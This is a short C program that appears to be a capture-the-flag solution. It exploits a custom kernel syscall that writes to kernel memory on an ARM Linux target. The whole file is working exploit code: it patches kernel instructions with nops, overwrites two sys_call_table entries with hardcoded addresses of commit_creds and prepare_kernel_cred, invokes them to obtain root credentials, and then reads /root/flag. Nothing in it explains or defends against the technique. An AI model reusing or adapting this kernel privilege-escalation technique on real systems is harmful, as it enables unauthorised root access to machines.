#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>


// commit_creds: 8003f56c
// prepare_kernel_cred: 8003f924



#define NR_SYS_UNUSED		223

#define SYS_CALL_TABLE		0x8000e348	


int main (int argc, char **argv){

    char *in = "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1"; // nop
    uint64_t out = 0x8003f560;
    syscall(NR_SYS_UNUSED, in, out);
    printf("lol1\n");

    in = "\x60\xf5\x03\x80";
    out = SYS_CALL_TABLE+10*4;
    syscall(NR_SYS_UNUSED, in, out);
    printf("lol2\n");
    in = "\x24\xf9\x03\x80";
    out = SYS_CALL_TABLE+13*4;
    syscall(NR_SYS_UNUSED, in, out);
    printf("lol3\n");
    syscall(10, syscall(13, 0x0));
    
    system("/bin/cat /root/flag");
    return 0;
}